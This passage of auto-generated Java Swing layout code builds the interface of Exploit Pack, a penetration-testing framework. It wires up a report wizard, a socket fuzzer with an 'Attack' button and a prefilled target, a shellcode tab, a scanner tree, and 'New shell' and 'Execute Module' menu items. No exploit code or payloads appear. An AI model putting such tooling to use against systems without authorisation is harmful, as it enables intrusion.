                    .addComponent(jComboBoxCustom1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel18)
                    .addComponent(jTextFieldCustom1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel19)
                    .addComponent(jLabel20)
                    .addComponent(jTextFieldCustomDesc1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jPanel23.setBackground(java.awt.Color.white);
        jPanel23.setBorder(javax.swing.BorderFactory.createTitledBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 0, 0), 1, true), "Overview ( Header )"));

        jTextAreaPentestHeader.setColumns(20);
        jTextAreaPentestHeader.setLineWrap(true);
        jTextAreaPentestHeader.setRows(5);
        jScrollPane17.setViewportView(jTextAreaPentestHeader);

        javax.swing.GroupLayout jPanel23Layout = new javax.swing.GroupLayout(jPanel23);
        jPanel23.setLayout(jPanel23Layout);
        jPanel23Layout.setHorizontalGroup(
            jPanel23Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel23Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane17)
                .addContainerGap())
        );
        jPanel23Layout.setVerticalGroup(
            jPanel23Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel23Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane17)
                .addContainerGap())
        );

        jButton2.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/buglittle.png"))); // NOI18N
        jButton2.setText("Generate");
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        jPanel25.setBackground(java.awt.Color.white);
        jPanel25.setBorder(javax.swing.BorderFactory.createTitledBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 0, 0), 1, true), "Custom finding: 2"));

        jComboBoxCustom2.setModel(new javax.swing.DefaultComboBoxModel(new String[] { "Low", "Normal", "Higher", "Critical" }));

        jLabel24.setText("Name:");

        jTextFieldCustom2.setText("vulnerability name..");

        jLabel25.setText("Risk level:");

        jLabel26.setText("Description:");

        jTextFieldCustomDesc2.setText("The ftp server is prone to a heap based overflow by abusing of CVE: 123");

        javax.swing.GroupLayout jPanel25Layout = new javax.swing.GroupLayout(jPanel25);
        jPanel25.setLayout(jPanel25Layout);
        jPanel25Layout.setHorizontalGroup(
            jPanel25Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel25Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel24)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jTextFieldCustom2, javax.swing.GroupLayout.PREFERRED_SIZE, 235, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel25)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jComboBoxCustom2, javax.swing.GroupLayout.PREFERRED_SIZE, 84, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel26)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jTextFieldCustomDesc2, javax.swing.GroupLayout.PREFERRED_SIZE, 1, Short.MAX_VALUE)
                .addContainerGap())
        );
        jPanel25Layout.setVerticalGroup(
            jPanel25Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel25Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel25Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jComboBoxCustom2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel24)
                    .addComponent(jTextFieldCustom2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel25)
                    .addComponent(jLabel26)
                    .addComponent(jTextFieldCustomDesc2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jLabel21.setText("DISCLAIMER: The data exposed in Exploit Pack is confidential and intended solely for the use of the individual or entity to whom they are addressed.");

        javax.swing.GroupLayout jPanel9Layout = new javax.swing.GroupLayout(jPanel9);
        jPanel9.setLayout(jPanel9Layout);
        jPanel9Layout.setHorizontalGroup(
            jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel9Layout.createSequentialGroup()
                .addGroup(jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jPanel11, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(jPanel9Layout.createSequentialGroup()
                        .addComponent(jPanel23, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jPanel17, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(jPanel13, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel9Layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(jLabel21)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jButton2))
                    .addComponent(jPanel25, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );
        jPanel9Layout.setVerticalGroup(
            jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel9Layout.createSequentialGroup()
                .addGap(14, 14, 14)
                .addComponent(jPanel11, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jPanel17, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jPanel23, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel13, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel25, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(10, 10, 10)
                .addGroup(jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jButton2)
                    .addComponent(jLabel21)))
        );

        javax.swing.GroupLayout jPanel7Layout = new javax.swing.GroupLayout(jPanel7);
        jPanel7.setLayout(jPanel7Layout);
        jPanel7Layout.setHorizontalGroup(
            jPanel7Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel9, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        jPanel7Layout.setVerticalGroup(
            jPanel7Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel7Layout.createSequentialGroup()
                .addComponent(jPanel9, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addContainerGap())
        );

        jTabbedPane.addTab("Report Wizard", jPanel7);

        jPanel8.setBackground(java.awt.Color.white);

        jButton1.setText("Attack");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        jTextAreaSocketFuzz.setColumns(20);
        jTextAreaSocketFuzz.setRows(5);
        jScrollPane12.setViewportView(jTextAreaSocketFuzz);

        jLabel12.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/target.png"))); // NOI18N
        jLabel12.setText("Hostname or IP Address:");

        jTextFieldSocketURL.setText("http://www.exploitpack.com");

        jLabel13.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/binary.png"))); // NOI18N
        jLabel13.setText("Packet data:");

        jTextFieldSocketData.setText("1234567890asdfghjkl");

        jLabel14.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/port.png"))); // NOI18N
        jLabel14.setText("Port:");

        jTextFieldSocketPort.setText("80");

        jCheckBoxSocketRandom.setText("Random data");
        jCheckBoxSocketRandom.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jCheckBoxSocketRandomActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel8Layout = new javax.swing.GroupLayout(jPanel8);
        jPanel8.setLayout(jPanel8Layout);
        jPanel8Layout.setHorizontalGroup(
            jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel8Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel8Layout.createSequentialGroup()
                        .addComponent(jLabel12)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jTextFieldSocketURL, javax.swing.GroupLayout.PREFERRED_SIZE, 237, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jLabel14)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jTextFieldSocketPort, javax.swing.GroupLayout.PREFERRED_SIZE, 50, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jLabel13)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jTextFieldSocketData, javax.swing.GroupLayout.PREFERRED_SIZE, 182, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(jCheckBoxSocketRandom)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButton1)
                        .addGap(12, 12, 12))
                    .addGroup(jPanel8Layout.createSequentialGroup()
                        .addComponent(jScrollPane12)
                        .addGap(10, 10, 10))))
        );
        jPanel8Layout.setVerticalGroup(
            jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel8Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jButton1)
                    .addComponent(jLabel12)
                    .addComponent(jTextFieldSocketURL, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel13)
                    .addComponent(jTextFieldSocketData, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel14)
                    .addComponent(jTextFieldSocketPort, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jCheckBoxSocketRandom))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane12, javax.swing.GroupLayout.DEFAULT_SIZE, 696, Short.MAX_VALUE)
                .addContainerGap())
        );

        jTabbedPane.addTab("Socket Fuzzer", jPanel8);

        jPanel4.setBackground(java.awt.Color.white);

        jTextAreaShellcodeList.setColumns(20);
        jTextAreaShellcodeList.setRows(5);
        jTextAreaShellcodeList.setText("This is a quick cheat sheet that contains the most useful shellcodes to start coding and debugging your new exploit.\nYou can always submit your own by sending it to submit@exploitpack.com with subject: shellcodes.");
        jScrollPane7.setViewportView(jTextAreaShellcodeList);

        javax.swing.GroupLayout jPanel4Layout = new javax.swing.GroupLayout(jPanel4);
        jPanel4.setLayout(jPanel4Layout);
        jPanel4Layout.setHorizontalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel4Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane7, javax.swing.GroupLayout.DEFAULT_SIZE, 1334, Short.MAX_VALUE)
                .addContainerGap())
        );
        jPanel4Layout.setVerticalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane7, javax.swing.GroupLayout.DEFAULT_SIZE, 706, Short.MAX_VALUE)
        );

        jTabbedPane.addTab("Shellcodes", jPanel4);

        jPanel10.setBackground(java.awt.Color.white);

        jPanel12.setBackground(java.awt.Color.white);
        jPanel12.setBorder(javax.swing.BorderFactory.createTitledBorder("Dashboard"));

        jLabel23.setText("No data available..");

        javax.swing.GroupLayout jPanel12Layout = new javax.swing.GroupLayout(jPanel12);
        jPanel12.setLayout(jPanel12Layout);
        jPanel12Layout.setHorizontalGroup(
            jPanel12Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel12Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel23, javax.swing.GroupLayout.PREFERRED_SIZE, 125, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(1185, Short.MAX_VALUE))
        );
        jPanel12Layout.setVerticalGroup(
            jPanel12Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel12Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel23)
                .addContainerGap(648, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout jPanel10Layout = new javax.swing.GroupLayout(jPanel10);
        jPanel10.setLayout(jPanel10Layout);
        jPanel10Layout.setHorizontalGroup(
            jPanel10Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel10Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jPanel12, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addContainerGap())
        );
        jPanel10Layout.setVerticalGroup(
            jPanel10Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel10Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jPanel12, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addContainerGap())
        );

        jTabbedPane.addTab("Live test", jPanel10);

        jTextAreaQuickInfo.setBackground(java.awt.Color.black);
        jTextAreaQuickInfo.setColumns(20);
        jTextAreaQuickInfo.setForeground(java.awt.Color.green);
        jTextAreaQuickInfo.setRows(5);
        jTextAreaQuickInfo.setText("[10:19:14] Application started\n");
        jScrollPane3.setViewportView(jTextAreaQuickInfo);

        javax.swing.GroupLayout jPanel14Layout = new javax.swing.GroupLayout(jPanel14);
        jPanel14.setLayout(jPanel14Layout);
        jPanel14Layout.setHorizontalGroup(
            jPanel14Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 846, Short.MAX_VALUE)
        );
        jPanel14Layout.setVerticalGroup(
            jPanel14Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane3, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 105, Short.MAX_VALUE)
        );

        jTabbedPane1.addTab("Quick Information", jPanel14);

        jTextAreaAppLog.setColumns(20);
        jTextAreaAppLog.setRows(5);
        jScrollPane10.setViewportView(jTextAreaAppLog);

        javax.swing.GroupLayout jPanel19Layout = new javax.swing.GroupLayout(jPanel19);
        jPanel19.setLayout(jPanel19Layout);
        jPanel19Layout.setHorizontalGroup(
            jPanel19Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane10, javax.swing.GroupLayout.DEFAULT_SIZE, 846, Short.MAX_VALUE)
        );
        jPanel19Layout.setVerticalGroup(
            jPanel19Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane10, javax.swing.GroupLayout.DEFAULT_SIZE, 105, Short.MAX_VALUE)
        );

        jTabbedPane1.addTab("Application Log", jPanel19);

        jTextAreaDebugging.setColumns(20);
        jTextAreaDebugging.setRows(5);
        jTextAreaDebugging.setText("Debugging and Exceptions. ( For developers and Testers )\n");
        jScrollPane11.setViewportView(jTextAreaDebugging);

        javax.swing.GroupLayout jPanel20Layout = new javax.swing.GroupLayout(jPanel20);
        jPanel20.setLayout(jPanel20Layout);
        jPanel20Layout.setHorizontalGroup(
            jPanel20Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane11, javax.swing.GroupLayout.DEFAULT_SIZE, 846, Short.MAX_VALUE)
        );
        jPanel20Layout.setVerticalGroup(
            jPanel20Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane11, javax.swing.GroupLayout.DEFAULT_SIZE, 105, Short.MAX_VALUE)
        );

        jTabbedPane1.addTab("Debug ( for developers )", jPanel20);

        jPanel5.setBackground(java.awt.Color.white);

        jLabel10.setText("Status:");

        jLabelWelcome.setFont(new java.awt.Font("Lucida Grande", 1, 13)); // NOI18N
        jLabelWelcome.setText("Licensed to: - [Juan Sacco]");

        javax.swing.GroupLayout jPanel5Layout = new javax.swing.GroupLayout(jPanel5);
        jPanel5.setLayout(jPanel5Layout);
        jPanel5Layout.setHorizontalGroup(
            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel5Layout.createSequentialGroup()
                .addComponent(jLabelWelcome)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(jLabel10)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jProgressBarModuleStatus, javax.swing.GroupLayout.PREFERRED_SIZE, 114, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(0, 0, 0))
        );
        jPanel5Layout.setVerticalGroup(
            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel5Layout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(jProgressBarModuleStatus, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(jLabel10)
                        .addComponent(jLabelWelcome))))
        );

        jLabelWelcome.getAccessibleContext().setAccessibleName("");

        jPanel21.setBackground(java.awt.Color.white);
        jPanel21.setBorder(javax.swing.BorderFactory.createTitledBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 0, 0), 1, true), "Network Scanner", javax.swing.border.TitledBorder.DEFAULT_JUSTIFICATION, javax.swing.border.TitledBorder.TOP));

        treeNode1 = new javax.swing.tree.DefaultMutableTreeNode("JTree");
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("Nmap - Built-in");
        treeNode1.add(treeNode2);
        jTreeRemoteScanner.setModel(new javax.swing.tree.DefaultTreeModel(treeNode1));
        jTreeRemoteScanner.setRootVisible(false);
        jScrollPane4.setViewportView(jTreeRemoteScanner);

        javax.swing.GroupLayout jPanel21Layout = new javax.swing.GroupLayout(jPanel21);
        jPanel21.setLayout(jPanel21Layout);
        jPanel21Layout.setHorizontalGroup(
            jPanel21Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel21Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane4, javax.swing.GroupLayout.DEFAULT_SIZE, 216, Short.MAX_VALUE)
                .addContainerGap())
        );
        jPanel21Layout.setVerticalGroup(
            jPanel21Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel21Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane4, javax.swing.GroupLayout.DEFAULT_SIZE, 144, Short.MAX_VALUE)
                .addContainerGap())
        );

        jPanel22.setBackground(java.awt.Color.white);
        jPanel22.setBorder(javax.swing.BorderFactory.createTitledBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 0, 0), 1, true), "Modules Executed", javax.swing.border.TitledBorder.DEFAULT_JUSTIFICATION, javax.swing.border.TitledBorder.TOP));

        treeNode1 = new javax.swing.tree.DefaultMutableTreeNode("JTree");
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("Module status");
        treeNode1.add(treeNode2);
        jTreeModuleStatus.setModel(new javax.swing.tree.DefaultTreeModel(treeNode1));
        jTreeModuleStatus.setRootVisible(false);
        jScrollPane5.setViewportView(jTreeModuleStatus);

        javax.swing.GroupLayout jPanel22Layout = new javax.swing.GroupLayout(jPanel22);
        jPanel22.setLayout(jPanel22Layout);
        jPanel22Layout.setHorizontalGroup(
            jPanel22Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel22Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane5, javax.swing.GroupLayout.DEFAULT_SIZE, 204, Short.MAX_VALUE)
                .addContainerGap())
        );
        jPanel22Layout.setVerticalGroup(
            jPanel22Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel22Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane5, javax.swing.GroupLayout.DEFAULT_SIZE, 146, Short.MAX_VALUE)
                .addContainerGap())
        );

        jButtonExecution.setText("Execute Module");
        jButtonExecution.setMaximumSize(new java.awt.Dimension(140, 29));
        jButtonExecution.setMinimumSize(new java.awt.Dimension(140, 29));
        jButtonExecution.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButtonExecutionActionPerformed(evt);
            }
        });

        jMenu1.setText("File");

        jMenuItem2.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_N, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem2.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/new.png"))); // NOI18N
        jMenuItem2.setText("New project");
        jMenuItem2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem2ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem2);

        jMenuItem3.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_O, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem3.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/open.png"))); // NOI18N
        jMenuItem3.setText("Open project");
        jMenuItem3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem3ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem3);
        jMenu1.add(jSeparator15);

        jMenuItem48.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_M, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem48.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/scriptnormal.png"))); // NOI18N
        jMenuItem48.setText("New module");
        jMenuItem48.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem48ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem48);
        jMenu1.add(jSeparator29);

        jMenuItem6.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_R, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem6.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/bugbug.png"))); // NOI18N
        jMenuItem6.setText("New shell");
        jMenuItem6.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem6ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem6);
        jMenu1.add(jSeparator13);

        jMenuItem5.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_S, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem5.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1316134049_table_save.png"))); // NOI18N
        jMenuItem5.setText("Save project");
        jMenu1.add(jMenuItem5);

        jMenuItem4.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_C, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem4.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/close.gif"))); // NOI18N
        jMenuItem4.setText("Close project");
        jMenu1.add(jMenuItem4);
        jMenu1.add(jSeparator14);

        jMenuItem1.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_E, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem1.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/stop.png"))); // NOI18N
        jMenuItem1.setText("Exit");
        jMenuItem1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem1ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem1);

        jMenuBar1.add(jMenu1);

        jMenu17.setText("Targets");

        jMenuItem63.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/refresh.png"))); // NOI18N
        jMenuItem63.setText("Refresh list");
        jMenuItem63.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem63ActionPerformed(evt);
            }
        });
        jMenu17.add(jMenuItem63);

        jMenuItem64.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1447116577_trash.png"))); // NOI18N
        jMenuItem64.setText("Remove");
        jMenuItem64.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem64ActionPerformed(evt);
            }
        });
        jMenu17.add(jMenuItem64);

        jMenuBar1.add(jMenu17);

        jMenu2.setText("Edit");

        jMenuItem7.setAction(new DefaultEditorKit.CutAction());
        jMenuItem7.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_X, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem7.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1316134425_cut_red.png"))); // NOI18N
        jMenuItem7.setText("Cut");
        jMenu2.add(jMenuItem7);

        jMenuItem8.setAction(new DefaultEditorKit.CopyAction());
        jMenuItem8.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_V, java.awt.event.InputEvent.CTRL_MASK));
        jMenuItem8.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1316134439_page_copy.png"))); // NOI18N
        jMenuItem8.setText("Copy");
